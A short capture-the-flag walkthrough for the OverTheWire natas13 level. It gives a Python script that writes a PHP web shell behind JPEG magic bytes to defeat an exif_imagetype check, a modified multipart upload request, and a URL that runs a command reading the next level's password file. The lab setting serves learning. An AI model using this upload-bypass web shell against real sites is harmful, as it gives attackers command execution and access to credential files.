So for this challenge (similar to natas12 lvl) i created a simple python3 script:

	-> #!/bin/env/python3
	   import os
	   fh = open('revshell.php','wb')
	   fh.write(b'\xFF\xD8\xFF\xE0' + b'<? passthru($_GET["cmd"]); ?>')
	   fh.close()
 
This creates a file including the magic numbers at the beggining. The magic number bypasses exif_imagetype
and the function passthru to inyect our commands once we ask for this file to the server.

Capture the request using BurpSuite just to be sure, and also modify some headers like these below

------WebKitFormBoundaryh2eYYN4u3mtOrefb
Content-Disposition: form-data; name="filename"
Content-Type: application/x-php

kdv7qbep24.php             -> (it's demanding we modify this, beacose it was trying to upload a .jpg instead of a php which is what we want!)
------WebKitFormBoundaryh2eYYN4u3mtOrefb
Content-Disposition: form-data; name="uploadedfile"; filename="revshell.php"
Content-Type: application/x-php

ÿØÿà<? passthru($_GET["cmd"]); ?>           ->(this is how our payload looks like!)
------WebKitFormBoundaryh2eYYN4u3mtOrefb--


Forward the request, and look for the recently file we've just uploaded. Should in here:
	-> http://natas13.natas.labs.overtherwire/uploads/f20302gj4.php?cmd=cat /etc/natas_webpass/natas14
